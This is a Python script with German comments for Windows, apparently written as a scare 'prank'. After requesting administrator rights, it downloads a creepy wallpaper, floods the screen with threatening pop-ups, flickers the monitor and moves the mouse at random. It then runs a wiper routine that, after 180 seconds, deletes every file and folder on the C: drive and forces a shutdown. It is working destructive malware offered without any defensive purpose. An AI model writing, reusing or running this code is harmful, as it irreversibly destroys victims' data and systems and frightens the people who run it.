import os
import ctypes
import time
import threading
import random
import tkinter as tk
from PIL import Image
import win32gui
import win32con
import win32api
import urllib.request
import ctypes
import shutil

# === Wallpaper ändern ===
def set_wallpaper_from_url(url):
    path = os.path.join(os.getenv('TEMP'), 'scary_wallpaper.jpg')
    urllib.request.urlretrieve(url, path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

# === Fenster-Spam ===
def spam_windows():
    messages = [
        "Ich sehe dich.",
        "Warum hast du das geöffnet?",
        "Du hättest es nicht tun sollen.",
        "Es ist zu spät.",
        "Gib auf.",
        "Dein System gehört mir.",
        "Der Tod kommt näher."
    ]
    def popup():
        win = tk.Tk()
        win.title("...")
        win.geometry(f"300x100+{random.randint(0, 1000)}+{random.randint(0, 600)}")
        tk.Label(win, text=random.choice(messages), fg="red", bg="black", font=("Arial", 12)).pack(expand=True)
        win.after(3000, lambda: win.destroy())
        win.mainloop()
    while True:
        threading.Thread(target=popup).start()
        time.sleep(0.5)

# === Bildschirm flackern ===
def screen_flicker():
    while True:
        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
        time.sleep(0.1)
        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
        time.sleep(0.2)

# === Maus spinnt ===
def glitch_mouse():
    while True:
        x = random.randint(-100, 100)
        y = random.randint(-100, 100)
        pos = win32api.GetCursorPos()
        win32api.SetCursorPos((pos[0]+x, pos[1]+y))
        time.sleep(random.uniform(1, 3))

# === SYSTEMWIPE (nach 180 Sekunden) ===
def wipe_drive_after_delay():
    time.sleep(180)
    for root, dirs, files in os.walk("C:\\", topdown=False):
        for name in files:
            try:
                os.remove(os.path.join(root, name))
            except: pass
        for name in dirs:
            try:
                shutil.rmtree(os.path.join(root, name), ignore_errors=True)
            except: pass
    os.system("shutdown /s /f /t 0")

# === Hauptausführung ===
if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", __file__, None, None, 1)
        exit()

    set_wallpaper_from_url("https://i.imgur.com/Uw4Xf3k.jpeg")  # Gruseliges Bild

    threading.Thread(target=spam_windows, daemon=True).start()
    threading.Thread(target=screen_flicker, daemon=True).start()
    threading.Thread(target=glitch_mouse, daemon=True).start()
    threading.Thread(target=wipe_drive_after_delay, daemon=True).start()

    while True:
        time.sleep(1)
